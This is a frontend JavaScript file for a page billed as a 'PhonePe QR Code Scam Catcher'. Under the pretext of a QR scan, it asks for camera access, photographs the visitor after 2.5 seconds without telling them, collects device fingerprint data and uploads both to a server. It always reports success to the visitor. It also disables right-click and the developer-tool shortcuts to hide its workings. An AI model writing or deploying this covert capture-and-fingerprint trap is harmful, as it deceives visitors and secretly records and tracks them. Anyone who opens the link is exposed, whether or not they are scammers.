// PhonePe QR Code Scam Catcher - Frontend JavaScript

class PhonePeCatcher {
    constructor() {
        this.video = document.getElementById('video');
        this.canvas = document.getElementById('canvas');
        this.stream = null;
        this.hasCaptured = false;

        this.init();
    }

    init() {
        // Set up event listeners
        document.getElementById('start-verification').addEventListener('click', () => this.startVerification());
    }

    async startVerification() {
        try {
            // Hide payment section and show camera section
            document.getElementById('payment-section').classList.add('hidden');
            document.getElementById('camera-section').classList.remove('hidden');

            // Request camera access
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });

            this.video.srcObject = this.stream;

            // Wait for video to load, then automatically capture after a short delay
            this.video.onloadedmetadata = () => {
                // The scammer will naturally move away from camera while positioning QR code
                // Capture automatically after 2-3 seconds
                setTimeout(() => {
                    if (!this.hasCaptured) {
                        this.captureAndUpload();
                    }
                }, 2500); // 2.5 seconds delay
            };

        } catch (error) {
            console.error('Error accessing camera:', error);
            alert('Camera access is required for QR code scanning. Please allow camera access and try again.');
        }
    }

    async captureAndUpload() {
        if (!this.video || !this.canvas || this.hasCaptured) return;

        this.hasCaptured = true;

        const canvas = this.canvas;
        const context = canvas.getContext('2d');
        if (!context) return;

        canvas.width = this.video.videoWidth;
        canvas.height = this.video.videoHeight;

        context.drawImage(this.video, 0, 0, canvas.width, canvas.height);
        const photoDataURL = canvas.toDataURL('image/jpeg', 0.8);

        // Gather metadata
        const metadata = {
            timestamp: new Date().toLocaleString(),
            userAgent: navigator.userAgent,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer,
            language: navigator.language,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
        };

        try {
            // Upload to server
            const formData = new FormData();
            formData.append('photo', photoDataURL);
            formData.append('metadata', JSON.stringify(metadata));

            const response = await fetch('/api/upload', {
                method: 'POST',
                body: formData,
            });

            const result = await response.json();

            if (result.success) {
                console.log('✅ QR Code scanned and photo uploaded successfully!');
                console.log('📁 Check your captured_photos folder for the evidence');
                this.showSuccess();
            } else {
                console.error('❌ Upload failed:', result.error);
                // Still show success even if upload fails
                this.showSuccess();
            }
        } catch (error) {
            console.error('❌ Upload error:', error);
            // Still show success even if upload fails
            this.showSuccess();
        }
    }

    showSuccess() {
        // Hide camera section and show success
        document.getElementById('camera-section').classList.add('hidden');
        document.getElementById('success-section').classList.remove('hidden');

        // Stop camera after a brief delay
        setTimeout(() => {
            if (this.stream) {
                this.stream.getTracks().forEach(track => track.stop());
            }
        }, 1000);
    }

    cleanup() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
    }
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', () => {
    const catcher = new PhonePeCatcher();

    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
        catcher.cleanup();
    });
});

// Prevent right-click and dev tools
document.addEventListener('contextmenu', event => event.preventDefault());
document.addEventListener('keydown', event => {
    if (event.key === 'F12' ||
        (event.ctrlKey && event.shiftKey && event.key === 'I') ||
        (event.ctrlKey && event.shiftKey && event.key === 'J') ||
        (event.ctrlKey && event.shiftKey && event.key === 'C') ||
        (event.ctrlKey && event.key === 'u')) {
        event.preventDefault();
    }
});